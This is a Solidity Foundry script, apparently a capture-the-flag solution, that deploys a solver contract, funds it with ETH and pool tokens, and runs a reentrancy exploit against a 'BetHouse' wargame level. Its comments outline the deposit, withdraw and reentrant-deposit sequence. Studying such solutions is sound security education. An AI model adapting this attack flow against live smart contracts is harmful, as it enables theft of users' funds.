// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "lib/forge-std/src/Script.sol";
import {BetHouseSolver} from "../src/BetHouseSolver.sol";
import {PoolToken} from "../src/PoolToken.sol";
import {Pool} from "../src/Pool.sol";
import {BetHouse} from "../src/BetHouse.sol";

/**
 * @title BetHouseSolveScript
 * @notice Deploys BetHouseSolver and drives the BetHouse exploit end-to-end
 *         on whatever chain $RPC_URL points at.
 *
 * @dev Foundry-scripting notes (see repo README for the full write-up):
 *      - `setUp()` runs in local simulation only. It's for read-only wiring
 *        to contracts that ALREADY exist on-chain (interface casts, env
 *        var reads). Nothing here is ever broadcast.
 *      - `run()`, inside startBroadcast()/stopBroadcast(), is where every
 *        deployment and state-changing call actually gets sent as a real
 *        transaction. `vm.deal` does NOT work here — real ETH must be sent
 *        explicitly.
 */
contract BetHouseSolveScript is Script {
    error FailedToFundSolver();

    /// @dev Matches Pool's ether-deposit threshold (0.001 ether mints 10
    ///      wrapped tokens); solver also needs this much ETH to forward.
    uint256 private constant ETHER_DEPOSIT = 0.001 ether;

    /// @dev PDT amount the player starts with / hands off to the solver.
    uint256 private constant PDT_AMOUNT = 5;

    // --- on-chain references, wired up in setUp(), read-only ---
    address betHouseAddr;
    address player;
    BetHouse betHouse;
    Pool pool;
    PoolToken depositToken;

    // --- deployed in run(), inside the broadcast ---
    BetHouseSolver solver;

    /// @notice Local-only setup: point interfaces at existing contracts and
    ///         read env vars. Nothing here touches the real chain.
    function setUp() public {
        betHouseAddr = vm.envAddress("LEVEL");
        betHouse = BetHouse(betHouseAddr);
        pool = Pool(betHouse.pool());
        depositToken = PoolToken(pool.depositToken());
        player = vm.envAddress("MY_ADDRESS");

        console.log("player address: ", player);
    }

    /// @notice Broadcasts the actual exploit: deploy solver, fund it with
    ///         real ETH + PDT, then trigger the reentrancy attack.
    function run() public {
        vm.startBroadcast();

        // Deploy the exploit contract for real (must happen inside the
        // broadcast, or it only exists in local simulation).
        solver = new BetHouseSolver(betHouseAddr, player);

        // Fund solver with real ETH — vm.deal only works in simulation.
        (bool sent, ) = payable(address(solver)).call{value: ETHER_DEPOSIT}("");
        if (!sent) revert FailedToFundSolver();

        // Hand the solver the PDT it needs for the deposit leg.
        depositToken.transfer(address(solver), PDT_AMOUNT);

        // Runs: deposit -> withdrawAll -> (reentrant) deposit -> lockDeposits
        // -> makeBet(player). See BetHouseSolver.sol for the full exploit.
        solver.attack();

        vm.stopBroadcast();
    }
}
